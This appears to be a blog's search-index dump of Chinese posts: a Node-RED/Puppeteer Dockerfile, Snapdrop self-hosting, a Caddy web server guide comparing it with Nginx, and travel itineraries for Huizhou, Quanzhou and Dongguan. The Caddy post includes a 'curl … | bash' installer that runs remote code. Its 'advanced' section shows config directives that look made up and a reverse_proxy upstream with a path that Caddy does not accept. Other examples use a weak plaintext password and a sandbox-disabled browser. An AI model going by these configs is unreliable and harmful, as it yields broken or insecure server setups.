\u0026amp;\u0026amp; \\ tar -xf node.tar.xz -C /usr/local --strip-components=1 \u0026amp;\u0026amp; \\ rm node.tar.xz # 设置 npm 版本 RUN npm install -g npm@11.4.1 # 安装 Node-RED RUN npm install -g --unsafe-perm node-red@4.0.9 # 创建工作目录 WORKDIR /app # 拷贝 Puppeteer 测试脚本 COPY test-puppeteer.js . # 安装 Puppeteer（跳过自动下载 chromium） RUN npm install puppeteer # 启动时先运行 Puppeteer 测试脚本，再启动 Node-RED CMD node test-puppeteer.js \u0026amp;\u0026amp; node-red test-puppeteer.js 内容（已适配 arm64） const puppeteer = require(\u0026#39;puppeteer\u0026#39;); (async () =\u0026gt; { try { console.log(\u0026#39;Launching browser...\u0026#39;); const browser = await puppeteer.launch({ executablePath: \u0026#39;/usr/bin/chromium\u0026#39;, // arm64 chromium 路径 headless: \u0026#39;new\u0026#39;, args: [\u0026#39;--no-sandbox\u0026#39;, \u0026#39;--disable-setuid-sandbox\u0026#39;] }); const page = await browser.newPage(); await page.goto(\u0026#39;https://example.com\u0026#39;); console.log(\u0026#39;Page title:\u0026#39;, await page.title()); await browser.close(); } catch (err) { console.error(\u0026#39;Puppeteer error:\u0026#39;, err); } })(); 构建并运行容器 docker build -t openwrt-aarch64-nodered-puppeteer . docker run -p 1880:1880 --rm openwrt-aarch64-nodered-puppeteer Puppeteer 会在容器启动时测试一次页面并打印标题\nNode-RED 会在端口 1880 启动并保持运行\n访问 Node-RED 浏览器访问：\nhttp://localhost:1880\n流程\n1.复制完整的文件内容\n2.docker构建\ndocker build -t openwrt-aarch64-nodered-puppeteer . docker run -p 1880:1880 \u0026ndash;rm openwrt-aarch64-nodered-puppeteer\n3.访问 端口:1880\n4.导入flow json文件\n5.节点安装email\n注意 debian环境 执行路径需要更换 node /app/puopenclashstart612.js\nEND\n","permalink":"https://qfsyso.github.io/posts/nodered-test-ytb-change-netwrok/","summary":"Setup Node-RED 一、前提条件：安装 Node.js Node-RED 需要 Node.js 环境，需先安装 Node.js。\n打开 Node.js 官网：https://nodejs.org/ 下载并安装 LTS（长期支持）版本 安装完成后打开终端（Win + X → 终端），输入以下命令检查是否安装成功： node -v npm -v 二、全局安装 Node-RED 在命令行中执行以下命令安装 Node-RED：\nnpm install -g --unsafe-perm node-red 说明：\n-g：表示全局安装 --unsafe-perm：解决某些系统中权限问题 三、启动 Node-RED 安装完成后，在终端中运行：\nnode-red 输出类似以下内容：\nServer now running at http://127.0.0.1:1880/ 四、访问 Node-RED 编辑器 打开浏览器访问：\nhttp://localhost:1880 即可进入图形化流程编辑界面。\n🛠️ 五、可选：创建桌面快捷方式（.bat 启动脚本） 创建一个文本文件，内容如下：\n@echo off title Node-RED node-red pause 保存为 node-red.bat\n双击即可启动 Node-RED\n六、（可选）将 Node-RED 作为后台服务运行 你可以使用如下工具实现后台服务：\npm2（推荐）：适用于 Node.","title":"NodeRed Test YTB Change NetWrok"},{"content":"Snapdrop：开源浏览器版 AirDrop 文件传输工具 Snapdrop 是一个纯浏览器实现的开源局域网文件传输工具，基于 WebRTC 和 WebSocket 技术，提供类似 Apple AirDrop 的跨平台即时文件共享体验。\n🚀 Snapdrop 的优势 设备自动发现：同一局域网内自动识别设备，无需手动连接或配对。 无平台限制：只要能打开浏览器（Chrome / Safari / Edge / Firefox 等）即可使用。 匿名上传与下载：无需登录，匿名操作保障隐私。 端到端加密：基于 WebRTC 的 DTLS 和 SDES 协议，确保传输安全。 PWA 支持：可添加到手机主屏，像 App 一样快捷打开。 ⚙️ 快速使用方式 在线使用 直接访问 https://snapdrop.net 确保设备处于同一 Wi-Fi 或局域网 浏览器打开 Snapdrop 网页 选择设备 → 上传文件 → 对方点击下载即可 自托管部署（增强隐私） 方式一：手动部署 git clone https://github.com/Snapdrop/Snapdrop.git cd Snapdrop npm install npm start 访问：http://localhost:3000\n方式二：使用 Docker 一键部署 docker run -d --name=snapdrop -p 80:80 -p 443:443 \\ -v /path/to/config:/config \\ lscr.io/linuxserver/snapdrop:latest 📦 使用场景举例 📱 家庭多设备互传图片，不用微信压缩 🧑‍🏫 会议中共享 PPT 或录音，现场即时传输 🏫 学校机房 / 工作室内快速资料传输 🧳 出门在外，手机电脑之间快速互传 📷 旧手机向新手机传照片，断网也能搞定 ✅ 总结 Snapdrop 是一个真正跨平台、开源、免费、零门槛的文件传输神器：\n不用安装 App 不用扫码 不用注册账号 安全加密 支持多种平台互传： Android ⇄ iPhone Windows ⇄ macOS Linux ⇄ 平板 iPad ⇄ 智能电视 只要设备处于同一局域网，打开浏览器即可像 “碰一下就传过去” 一样丝滑传输。\n🔒 若对隐私安全更在意，推荐自建服务部署到家庭或公司服务器。\n📌 Snapdrop 是临时文件传输的最佳解决方案，尤其适合频繁在不同设备间传文件的用户。\n在线体验 https://snapdrop.net/ GitHub 开源项目 https://github.com/Snapdrop/Snapdrop 自己构建适配 ARM 的镜像 如果需要自定义版本，或者社区镜像不满足需求，可以手动构建。\n克隆 Snapdrop 源码\ngit clone https://github.com/RobinLinus/snapdrop.git cd snapdrop 创建 Dockerfile（如果没有） Snapdrop 官方项目没有直接提供 Dockerfile，可以手动添加一个：\n# Dockerfile FROM node:18-alpine WORKDIR /app # 安装依赖 COPY package*.json ./ RUN npm install # 拷贝源代码 COPY . . # 构建 RUN npm run build # 运行 Snapdrop 服务 CMD [\u0026#34;npm\u0026#34;, \u0026#34;start\u0026#34;] 构建镜像（适配 ARM）\ndocker build -t snapdrop-arm . 运行容器\ndocker run -d \\ --name=snapdrop \\ -p 80:80 \\ --restart=unless-stopped \\ snapdrop-arm ✅ 网络注意事项 Snapdrop 使用 WebRTC 或 WebSocket 进行点对点连接，因此设备必须处于同一局域网。 如果在 Docker 中使用了 bridge 模式，确保端口正确映射。 如果浏览器无法连接，可以尝试换用 host 网络（适用于 Linux）： docker run -d --network host snapdrop-arm ✅ 测试 打开两个设备的浏览器，访问部署机器的局域网 IP 地址（如 http://192.168.1.100），如果一切正常，它们应该能自动发现彼此，并支持文件互传。\n","permalink":"https://qfsyso.github.io/posts/snapdrop/","summary":"Snapdrop：开源浏览器版 AirDrop 文件传输工具 Snapdrop 是一个纯浏览器实现的开源局域网文件传输工具，基于 WebRTC 和 WebSocket 技术，提供类似 Apple AirDrop 的跨平台即时文件共享体验。\n🚀 Snapdrop 的优势 设备自动发现：同一局域网内自动识别设备，无需手动连接或配对。 无平台限制：只要能打开浏览器（Chrome / Safari / Edge / Firefox 等）即可使用。 匿名上传与下载：无需登录，匿名操作保障隐私。 端到端加密：基于 WebRTC 的 DTLS 和 SDES 协议，确保传输安全。 PWA 支持：可添加到手机主屏，像 App 一样快捷打开。 ⚙️ 快速使用方式 在线使用 直接访问 https://snapdrop.net 确保设备处于同一 Wi-Fi 或局域网 浏览器打开 Snapdrop 网页 选择设备 → 上传文件 → 对方点击下载即可 自托管部署（增强隐私） 方式一：手动部署 git clone https://github.com/Snapdrop/Snapdrop.git cd Snapdrop npm install npm start 访问：http://localhost:3000\n方式二：使用 Docker 一键部署 docker run -d --name=snapdrop -p 80:80 -p 443:443 \\ -v /path/to/config:/config \\ lscr.","title":"Snapdrop"},{"content":"Debian 系统部署 Caddy Web 服务器的详细指南 本文档提供了在 Debian 系统上安装和配置 Caddy Web 服务器的步骤，包括多种安装方法、服务管理、HTTPS 配置、高级功能以及注意事项。此外，还对比了 Caddy 与 Nginx 的主要优势，并介绍了 Caddy 的一些高级特性。\n一、安装方法 APT 存储库安装（推荐） 更新系统：\nsudo apt update \u0026amp;\u0026amp; sudo apt upgrade -y 添加密钥和存储库：\nsudo apt install -y debian-archive-keyring apt-transport-https curl curl -1sLf \u0026#39;https://dl.cloudsmith.io/public/caddy/stable/gpg.key\u0026#39; | sudo gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg curl -1sLf \u0026#39;https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt\u0026#39; | sudo tee /etc/apt/sources.list.d/caddy-stable.list 安装 Caddy：\nsudo apt update \u0026amp;\u0026amp; sudo apt install caddy 快速脚本安装 curl https://getcaddy.com | bash -s personal http.filemanager -s 参数支持插件扩展（如 http.filemanager 文件管理插件） 商业用途需购买许可证 or\ncurl -fsSL https://get.caddyserver.com | bash -s personal 验证\ncaddy version 二、服务管理 启动并设置开机自启：\nsudo systemctl enable --now caddy 常用命令：\nsudo systemctl status caddy # 查看状态 sudo journalctl -u caddy -f # 查看实时日志 三、配置 HTTPS Caddy 自动启用 HTTPS，只需在配置文件中指定域名：\n编辑配置文件：\nsudo nano /etc/caddy/Caddyfile 示例配置：\nok.example.com { root * /var/www/html file_server tls your_email@example.com # 自动申请 Let\u0026#39;s Encrypt 证书 } 重启服务生效：\nsudo systemctl restart caddy 四、高级功能 反向代理 api.example.com { reverse_proxy localhost:8080 header_up X-Real-IP {remote_host} } 性能优化 添加 -quic 参数启用 HTTP/3（需在 caddy.service 中修改启动参数） 开放 UDP 443 端口 五、注意事项 防火墙需放行 80/443 端口：\nsudo ufw allow 80,443/tcp \u0026amp;\u0026amp; sudo ufw reload 若使用本地测试，浏览器可能提示自签名证书风险，需手动信任\n配置文件语法验证：\nsudo caddy validate --config /etc/caddy/Caddyfile 通过上述步骤，您可以在 Debian 系统上快速部署支持自动 HTTPS、反向代理等功能的 Caddy 服务器。\nCaddy 对比 Nginx 的主要优势分析 一、配置简单，学习成本低 Nginx 依赖纯文本配置文件（.conf），语法规则严格，需手动编写反向代理、SSL 证书配置等复杂逻辑，对新手不够友好。 配置 HTTPS 需手动申请证书并绑定路径，过程繁琐。 Caddy 声明式配置：使用更简洁的 Caddyfile 语法，内置常用功能（如反向代理、HTTPS）的默认规则，代码量可减少 50% 以上。 示例对比： Nginx 配置 HTTPS 反向代理： server { listen 443 ssl; server_name example.com; ssl_certificate /path/to/cert.pem; ssl_certificate_key /path/to/key.pem; location / { proxy_pass http://localhost:8080; } } Caddy 同等功能配置： example.com { reverse_proxy localhost:8080 } （Caddy 会自动申请并管理 SSL 证书，无需手动配置证书路径） 自动 HTTPS：内置 ACME 客户端，支持 Let’s Encrypt 证书自动申请、续签和管理，无需额外工具（如 Certbot）。 二、自动化与内置功能丰富 Nginx 核心功能简洁，需通过第三方模块（如 ngx_http_ssl_module、ngx_http_proxy_module）扩展功能，配置复杂且可能存在兼容性问题。 Caddy 内置功能开箱即用：自动 HTTPS、HTTP/2/3 支持、反向代理、负载均衡、WebSockets、静态文件服务、Gzip 压缩、日志记录等功能均为内置，无需手动启用模块。 支持实时重载配置（修改 Caddyfile 后自动生效，无需手动执行 nginx -s reload）。 生态插件灵活：通过 Go 语言插件机制（如 caddy plugin 命令）或直接在 Caddyfile 中声明（如 import 指令）扩展功能，无需编译源码。 三、现代化协议与性能优化 Nginx 对 HTTP/3（QUIC）的支持需编译时启用 ngx_http_v3_module，且配置较复杂；对 WebAssembly（Wasm）等新兴技术支持有限。 Caddy 原生支持 HTTP/3：默认启用对 QUIC 协议的支持，提升移动端和高延迟网络的访问速度。 Wasm 插件生态：可通过 Wasm 插件实现自定义逻辑（如身份验证、流量过滤），无需修改 Caddy 核心代码，灵活性更高。 内存占用优化：在轻量级场景下（如单服务器代理），内存消耗可能低于 Nginx（具体取决于负载和配置）。 四、部署与更新便捷性 Nginx 更新需手动下载二进制文件或通过包管理工具（如 apt/yum），可能涉及服务重启或配置文件迁移。 容器化部署（如 Docker）需手动管理配置文件和证书挂载。 Caddy 单一二进制文件：安装包仅一个可执行文件，支持跨平台（Linux/macOS/Windows），部署简单。 自动更新机制：通过 caddy upgrade 命令即可完成版本升级，支持热更新（不中断服务）。 容器化友好：官方 Docker 镜像默认包含常用配置，可通过环境变量快速配置（如 CADDYFILE_CONTENT 直接注入 Caddyfile 内容）。 五、适用场景对比 场景 Nginx Caddy 大型网站 / 高并发负载 成熟稳定，性能优化工具链完善（如 nginx -t 检测配置） 性能接近 Nginx，但生态工具（如灰度发布、监控）较少 中小项目 / 快速部署 需编写复杂配置，适合有经验的团队 配置简单，适合个人开发者或 CI/CD 自动化流程 现代化协议（HTTP/3） 需手动编译模块，配置门槛高 原生支持，一键启用 无状态代理 / 边缘计算 轻量级但需手动优化配置 内置自动优化（如连接池、缓存），适合边缘节点 开发环境调试 配置繁琐，修改后需重启服务 实时重载，支持动态调整配置 总结：Caddy 的核心优势 对新手友好：极简配置和自动 HTTPS 大幅降低入门门槛，适合快速搭建个人博客、API 服务等轻量级场景。 现代化特性：原生支持 HTTP/3、Wasm 插件和自动更新，适合需要前沿技术的项目。 运维提效：减少配置文件维护成本，尤其在多站点管理、证书自动化方面优势显著。 注意：Nginx 在企业级场景（如高并发反向代理、微服务网关）中仍占主导地位，因其生态成熟、社区文档丰富。若项目需要深度定制或复杂负载均衡策略，Nginx 仍是更稳妥的选择。\n一、动态配置与热更新 实时配置更新 通过 REST API 可在不重启服务的情况下动态调整配置，例如更新路由规则或证书：\ncurl -X PUT \u0026#34;http://localhost:2019/config\u0026#34; -d @new_config.json 支持 JSON 和 Caddyfile 格式的动态加载。\n动态 DNS 集成 结合 Cloudflare、AWS 等 DNS 服务，实现域名与 IP 的自动同步：\n{ dynamic example.com { dial_timeout 10s update_interval 10m } } 适用于动态 IP 环境下的服务部署。\n二、反向代理进阶配置 负载均衡与健康检查 支持轮询（Round Robin）、最少连接（Least Connections）等策略，并自动剔除故障节点：\nreverse_proxy backend1:8080 backend2:8080 { lb_policy round_robin health_check /health health_interval 15s } 通过 health_check 参数监控后端服务状态。\n协议转换与 WebSocket 支持 自动处理 HTTP/2 到 HTTP/1.1 的协议转换，并支持 WebSocket 长连接：\nreverse_proxy /ws/* localhost:3000 { transport http { versions h2c 2 } } 确保实时通信的稳定性。\n请求头与路径重写 透传客户端真实 IP 或重写请求路径：\nreverse_proxy { header_up X-Real-IP {remote_host} strip_prefix /api/v1 } 常用于微服务网关场景。\n三、安全与性能优化 高级 TLS 配置 自定义证书来源或启用加密客户端 Hello（ECH）：\nexample.com { tls { cert_file /path/to/cert.pem key_file /path/to/key.pem ech_enabled } } 增强隐私保护和证书管理灵活性。\n速率限制与流量控制 基于 IP 或请求路径限制访问频率：\nrate_limit { zone dynamic_zone { key {remote_host} events 10 window 10s } } 防止恶意请求或 DDoS 攻击。\n缓冲与并发优化 通过缓冲提升高延迟链路的传输效率：\nreverse_proxy { buffer_requests buffer_responses max_buffer_size 4k flush_interval 1s } 减少后端服务因客户端网络波动导致的阻塞。\n四、插件与生态扩展 插件化扩展 安装第三方插件实现 JWT 鉴权、Prometheus 监控等功能：\ncaddy install --source github.com/caddy-dns/cloudflare 支持自定义模块开发。\n日志与监控集成 输出结构化日志并集成 Prometheus：\nlog { output file /var/log/caddy/access.log format json } prometheus { push { endpoint \u0026#34;http://localhost:9090\u0026#34; } } 便于运维分析与报警。\n五、容器化与边缘计算 轻量化容器部署 通过 Docker 快速部署并挂载配置：\ndocker run -p 80:80 -v ./Caddyfile:/etc/caddy/Caddyfile caddy 适用于云原生和边缘计算场景。\n多实例集群管理 利用 API 协调多个 Caddy 实例，实现证书集中管理和配置同步。\n通过上述高级功能，Caddy 可满足企业级生产环境中对安全性、性能及灵活性的复杂需求。\ncaddy 绑定目录 Caddy 把外网域名 w1.a.com 和 w2.a.com 反向代理到同一个内网服务 内网1:999， 并且 w2.a.com 要代理到 内网1:999/com1 （也就是同一个后端服务下的 /com1 路径）。\nCaddyfile\n# 配置 w1.a.com -\u0026gt; http://内网1:999 w1.a.com { reverse_proxy 内网1:999 } # 配置 w2.a.com -\u0026gt; http://内网1:999/com1 w2.a.com { handle_path /* { uri strip_prefix / reverse_proxy 内网1:999/com1 } } reverse_proxy 内网1:999 把请求直接转发到内网服务的 999 端口。\nhandle_path + uri strip_prefix / 是为了确保用户访问 http://w2.a.com/xxx 时，转发到 http://内网1:999/com1/xxx。 strip_prefix 去掉域名后的前缀 /，再拼到后端路径。\n⚠️ 注意点 ✅ 如果后端是 HTTP，请写 http://内网1:999， ✅ 如果后端是 HTTPS，要用 https:// 并注意证书是否自签名。\n🚩 完整例子（带协议）： caddyfile\nw1.a.com { reverse_proxy http://192.168.1.100:999 } w2.a.com { handle_path /* { uri strip_prefix / reverse_proxy http://192.168.1.100:999/com1 } } 使用 caddy reload 热更新 caddy reload --config /path/to/Caddyfile Authentication Caddy 自带 Basic Authentication（基本认证），配置非常简单。\n1. 创建工作目录 mkdir caddy-test cd caddy-test 2. 创建 index.html 测试页面 echo \u0026#34;\u0026lt;h1\u0026gt;Hello Caddy!\u0026lt;/h1\u0026gt;\u0026#34; \u0026gt; index.html 3. 生成 Caddy 密码哈希 Caddy 要求 BasicAuth 使用 bcrypt 哈希。\ndocker run --rm caddy caddy hash-password --plaintext \u0026#34;123123\u0026#34; 假设返回结果：\n$2a$14$e5BY1Go8WI2jk/wv.jSUTunNdRRnZLc29y1VxpdMQK9prN16D/PVq\n这个就是要写进配置的哈希密码。\n4. 创建 Caddyfile 在 caddy-test 目录创建 Caddyfile：\n:80 { root * /srv file_server basicauth /* { # 用户名 admin，后面是上一步生成的哈希 admin $2a$14$e5BY1Go8WI2jk/wv.jSUTunNdRRnZLc29y1VxpdMQK9prN16D/PVq } } 5. 运行 Caddy 容器 docker run -d \\ --name caddy-test \\ -p 8080:80 \\ -v $(pwd)/Caddyfile:/etc/caddy/Caddyfile \\ -v $(pwd):/srv \\ caddy 6. 测试访问 浏览器打开 http://localhost:8080\n会提示输入用户名和密码（上面配置的 admin + 123123）。\n7. 补充 如果要用 HTTPS，可以直接改成：\nexample.com { root * /srv file_server basicauth /* { admin $2a$14$ABCxyz... } } 然后解析域名到服务器，Caddy 会自动申请 Let’s Encrypt 证书。\n","permalink":"https://qfsyso.github.io/posts/caddy/","summary":"Debian 系统部署 Caddy Web 服务器的详细指南 本文档提供了在 Debian 系统上安装和配置 Caddy Web 服务器的步骤，包括多种安装方法、服务管理、HTTPS 配置、高级功能以及注意事项。此外，还对比了 Caddy 与 Nginx 的主要优势，并介绍了 Caddy 的一些高级特性。\n一、安装方法 APT 存储库安装（推荐） 更新系统：\nsudo apt update \u0026amp;\u0026amp; sudo apt upgrade -y 添加密钥和存储库：\nsudo apt install -y debian-archive-keyring apt-transport-https curl curl -1sLf \u0026#39;https://dl.cloudsmith.io/public/caddy/stable/gpg.key\u0026#39; | sudo gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg curl -1sLf \u0026#39;https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt\u0026#39; | sudo tee /etc/apt/sources.list.d/caddy-stable.list 安装 Caddy：\nsudo apt update \u0026amp;\u0026amp; sudo apt install caddy 快速脚本安装 curl https://getcaddy.com | bash -s personal http.","title":"Caddy"},{"content":"惠州 d1 惠州一日游推荐路线（经典版） d1 关键词：自然风景 + 历史文化 + 城市慢游\n早上7:00-8:00出发 高铁到达后可打车或使用共享电单车前往景区。\n行程安排： 上午：惠州西湖 + 苏东坡纪念馆 📍【惠州西湖】是国家5A级景区，素有“小西湖”之称。\n必看景点：苏堤、平湖秋月、泗洲塔、孤山\n建议可租船游湖（手划船或电动船）\n🏛【苏东坡纪念馆】：了解东坡在惠州的贬谪岁月，免费参观\n🕒 游玩时间：2-2.5小时\n中午：西湖周边午餐 推荐本地小吃：\n梅菜扣肉、东江盐焗鸡、客家酿豆腐、炒米粉\n推荐店铺：阿婆小吃馆、西湖人家、惠州食街\n下午：红花湖骑行 or 逛古街 你可根据兴趣选择以下之一：\n✅ 方案 A：红花湖生态骑行 📍红花湖风景区，环湖绿道约19公里，沿途山林清幽、湖水清澈\n可租自行车/电动车慢骑一圈\n拍照打卡 + 吹风放空都超舒服！\n✅ 方案 B：下埔古村 or 丰渚园闲逛 📍下埔古村：岭南老巷古宅，文艺风浓厚，适合拍照 + 喝咖啡\n📍丰渚园：岭南园林风格+苏式园林结合，门票便宜，人少景美\n傍晚：东江边散步 + 晚餐 可选择回到【东江公园】或【水东街】沿江走走\n看落日 + 东江夜景，特别适合情侣/亲子慢游\n晚餐推荐东江鱼、烧鹅饭、潮汕牛肉火锅\n🏨 返回建议： 可选择高铁 19:00 – 21:00 之间返程\n或者住一晚民宿，第二天去双月湾/巽寮湾（适合两日游延伸）\n💡小贴士 项目\t建议 出行工具\t高铁 + 滴滴/共享单车为主，方便灵活 衣着\t轻便鞋子（西湖、红花湖走路较多） 拍照点\t泗洲塔远景、西湖桥影、红花湖湖面\n惠州 d2 行程总览​​ ​​主题​​：湖海双韵+美食暴走+山姆扫货 ​​住宿建议​​： 👉 ​​Day 1晚​​：西湖祝屋巷（文艺民宿集群，近美食） 👉 ​​Day 2晚​​：巽寮湾海景公寓（避开喧闹区） ​​交通​​：市区打车/共享电动车，山姆建议自驾或打车（距西湖仅4公里）\n🍃 ​​Day 1：西湖雅韵·山姆补给​​ ​\n上午：西湖慢时光​​ ​​08:30-10:00 惠州西湖（免费）​​ 重点走九曲桥、丰渚园荷花池，人少推荐菱湖绿道，租脚踏船泛舟（50元/小时）。 ​​10:30-12:00 元妙古观（门票5元）​​ 岭南千年道观，红墙古树间求签祈福（备10元香油钱）。 ​​\n午餐：地道客家味​​ ​​12:30 黎记大排档​​ 必点：萝卜杠煲鸡（酸香开胃）、酿豆腐（嫩滑爆汁），人均60元。\n​​下午：文艺街区+山姆扫货​​ ​​14:30-16:00 祝屋巷文创园（免费）​​ 打卡「猫的理想国」撸猫、「拾陆咖啡」露台观湖。 ​​16:30-18:30 山姆会员店（江北金山大道店）​​ ​\n​购物攻略​​： ✅ ​​必买美食​​：澳洲板腱牛排（199元/14块，原切多汁）、瑞士卷（68元/16块，冰淇淋口感）、麻薯（39元/24个，黑芝麻香浓）。 ✅ ​​省钱技巧​​：某宝租次卡（8元/次），关注长期降价商品（如MM鲜牛奶17.9元/2L）。 ✅ ​​体验​​：试吃车免费尝牛排/蛋糕，健康中心测视力血压。\n​​夜晚：水东街烟火气​​ ​​19:30 合江楼夜景（登顶10元）​​ 双江交汇灯光秀，二楼点味咖啡观景绝佳。 ​​宵夜​​：朱记食店「阿嬷叫」（芋头萝卜丝炸饼，3元/个）。\n🌊 ​​Day 2：滨海奇观·鲜味之旅​​ ​​\n方案A：经典滨海线（适合首次到访）​​ ​​09:00-11:00 双月湾观景台（免费）​​ 登顶俯瞰“左湾平静，右湾波涛”奇观，航拍更出片。 ​​11:30 港口镇海鲜大排档​​ 推荐「明记海鲜」：椒盐皮皮虾+海胆炒饭（人均80元），避坑景区入口高价店。 ​​14:00-16:00 海龟湾（门票30元）​​ 走临海栈道看野生海龟，下午4点后人少景美。 ​\n​方案B：小众人文线（避开人流）​​ ​​09:00-11:00 东平窑陶瓷园（免费）​​ 亲手制陶体验，嵌瓷片小径拍照文艺。 ​​11:30 横沥汤粉（老字号）​​ 猪骨大地鱼汤底+卤牛腩，10元/碗。 ​​14:00-16:00 大亚湾红树林湿地（免费）​​ 木栈道观白鹭，退潮时赶海挖贝。 ​​共同行程：日落与返程​​ ​​17:00 巽寮湾日落​​ 导航「屿海星幕」露营地，低消饮品享橘子海。 ​​晚餐：巽湾印象海胆宴​​ 央视推荐海胆刺身/炒饭，鲜甜不腥（人均100元）。\n🍽️ ​​惠州必吃美食地图​​ ​​类型​​\t​​推荐店/菜品​​\t​​位置​​\t​​亮点​​ ​​客家菜​​\t黎记-萝卜杠鸡煲\t西湖附近\t酸香解腻，鸡肉滑嫩 ​​海鲜​​\t明记-椒盐皮皮虾\t双月湾港口镇\t外酥里嫩，咸香入味 ​​小吃​​\t朱记-阿嬷叫\t水东街\t外脆内糯，萝卜丝清香 ​​糖水​​\t惠康汤粉店-龟苓膏椰奶\t桥东夜市\t微苦回甘，椰香浓郁\n⚠️ ​​实用贴士​​ ​​山姆攻略​​： 避开周末早高峰，工作日下午人少；冷冻食品离店前租保温袋（5元/个）。 4月新品：泡菜五花肉卷（18元/个）、桂花酒酿大福（69元/16个）可试。 ​​交通避坑​​： 市区→双月湾顺风车约60元（嘀嗒/哈啰），比大巴快30%。 ​​防宰指南​​： 海鲜称重前倒干水，美团查套餐价（如双人餐138元）。 ​​住宿推荐​​： 西湖：爱树·观湖书院（书吧+湖景窗）； 巽寮湾：九铭屿海公寓（人少安静，厨房可煮海鲜）。\n泉州 d2 行程总览​​ ​​主题​​：半城烟火半城仙（宗教文化+市井美食）+ 现代购物 ​​住宿建议​​：浦西万达或西街附近（交通便利，近商圈） ​​交通方式​​：古城内步行/小白电瓶车（2元/人）、打车或共享电动车 ​​\n🚶 Day 1：古城烟火与宗教文化巡礼​​ ​​上午：西街文化圈​​ ​​08:30-10:00 开元寺​​ 福建最大佛教寺院，打卡唐代东西双塔、大雄宝殿飞天雕塑，红墙拍照出片。 ​​10:00-12:00 西街美食探索​​ 必吃：吴氏手工麻糍（现包软糯）、勤阿姨芋头饼、侯阿婆烧肉粽（干贝沙茶馅）。 机位：莓超疯奶茶店三楼天台，俯瞰双塔与古城全景。\n​​下午：多元宗教建筑之旅​​ ​​14:00-15:00 清净寺​​ 中国现存最古老伊斯兰教寺（门票3元），注意着装：勿穿短裤/短裙。 ​​15:30-17:00 通淮关岳庙​​ 香火极旺的闽南关帝信仰中心，可求签掷筊，感受“半城仙”氛围。 ​​顺路打卡​​：承天寺（弘一法师圆寂地，清幽古朴）。 ​​\n晚上：夜生活与闽南味​​ ​​18:30 晚餐：斯丹姜母鸭​​ 砂锅焖烧鸭肉吸饱姜香，配米饭绝佳（排队较长，建议错峰）。 ​​20:00 浦西万达/领SHOW天地​​ 逛商圈消食，体验泉州年轻夜生活。 ​\n🌊 Day 2：海风民俗与购物休闲​​ ​​\n上午：蟳埔渔村风情​​ ​​09:00-11:00 蟳埔民俗文化村​​ 体验“今生戴花，来世漂亮”簪花头饰（砍价至40元/套），拍蚵壳厝民居、百年榕树，感受渔女文化。 ​​11:30 午餐：蟳埔海鲜​​ 大岞村白灼小管（鲜甜蘸酱油）或市区水门国仔面线糊（加醋肉、大肠）。\n​​下午：购物与文艺时光​​ ​​13:30-15:30 山姆会员商店（城华南路店）​​ 距市中心约6公里，采购网红烘焙、牛排等（建议预留2小时）。 ​​16:00-17:30 泉州非遗馆或海交馆​​ 二选一：非遗馆看木偶雕刻/金苍绣，海交馆了解宋元海洋贸易史（免费，避暑好去处）。 ​\n​晚上：闽南夜韵​​ ​​18:30 天后宫四果汤+求签​​ 秉正堂总店石花膏加冰解暑，投币求妈祖签（备硬币）。 ​​可选体验​​：木偶剧院（提前抢前排票）或南音艺苑听千年古乐。\n​​🍜 美食地图速览​​ ​​类别​​\t​​推荐店铺/菜品​​\t​​位置​​ 小吃\t吴氏麻糍、勤阿姨芋头饼\t西街 正餐\t斯丹姜母鸭、侯阿婆烧肉粽\t西街/涂门街 甜品饮品\t秉正堂四果汤、莓超疯天台奶茶\t天后宫/西街 海鲜\t白灼小管、面线糊\t蟳埔村/市区 ​​\n💡 实用贴士​​ ​​交通避坑​​： 高铁选“泉州站”（离市区最近），机场打车至市区约30分钟。 山姆店建议打车（起步价可达），回程可预约网约车。 ​​宗教礼仪​​： 关岳庙忌戴帽/墨镜；清净寺需长裤长裙。 ​​省钱技巧​​： 清源山早7点前/晚5点后免门票；小白车覆盖古城核心区。\n东莞 d2 ​​行程总览​​ ​​主题​​：半日文博+半日购物（Day1） | 老城烟火+潮流文艺（Day2） ​​住宿建议​​：莞城（近老字号美食）或东城（近商圈） ​​交通方式​​：市区打车（起步价7元）或共享电动车，山姆建议自驾/打车 ​​行程亮点​​： ✅ 打卡东莞首家山姆，解锁网红爆款 ✅ 尝遍小红书高赞苍蝇馆子+市场古早味 ✅ 避开人潮的文艺角落与非遗体验\n🏮 ​​Day 1：寮步文博之旅 + 山姆扫货狂欢​​ ​​\n上午：香市文化深度游​​（距市区约15km） ​​09:00-11:00 中国沉香文化博物馆​​ 何镜堂院士设计的“香盒”建筑，免费参观，沉浸式体验莞香千年历史，重点看格物知香展厅和饶宗颐题字牌匾。 ​​11:30-13:00 佛灵湖营地午餐​​ 湖畔露营风餐厅「坐北咖啡」简餐，或驱车10分钟至「贵州黄牛肉馆」吃干锅牛肉（薄荷提香，130元套餐够3人）。\n​​下午：潮流街区+山姆采购​​ ​​14:00-15:00 篮球印巷​​ 160个集装箱组成的运动主题街区，免费拍照打卡，买杯网红柠檬茶解腻。 ​​15:30-18:00 东莞山姆会员店​​ ​\n​必买清单​​： 🛒 瑞士卷（68元/16块，冰激凌口感） 🛒 芝士牛肉卷（餐吧现做，拉丝超长） 🛒 蒜香黄油烤法棍（39.9元，酥脆浓香） 🛒 小青柠汁（32.8元/8瓶，解腻神器） ​​Tips​​：某宝租次卡（8元/次），避开周末早高峰；试吃车推荐花雕醉蟹、有机香菇。\n​​晚上：寮步地道晚餐​​ ​​推荐选择​​： 👉 「蓝粤湾·海鲜粤宴」：本地人认可的粤菜，白切鸡配姜蓉饭 👉 「石步羊肉」：非遗羊肉煲（冬季限定），配腐乳蘸料\n🚲 ​​Day 2：莞城老味 + 文艺漫游​​（全程在市区10km内） ​​上午：古早味早餐+园林雅韵​​ ​​08:30-10:00 细村市场扫街​​ 必吃：无名早餐店烫粉+茅根粥、老字号云吞面（皮薄肉鲜，8元/碗）、东莞大包（叉烧馅爆汁）。 ​​10:30-12:00 东莞可园​​ 清代岭南四大名园之一，门票8元，看精巧亭台与居巢居廉画作，感受“窗含四时景”的园林美学。 ​#\n​下午：文艺巷弄+创意晚餐​​ ​​13:30-15:00 下坝坊​​ 青砖老房改造的文艺聚落，推荐「矮房子甜品店」吃榴莲忘返（榴莲+西米+椰奶），河边茶馆喝茶听民谣。 ​​15:30-17:30 工农8号创意园​​ 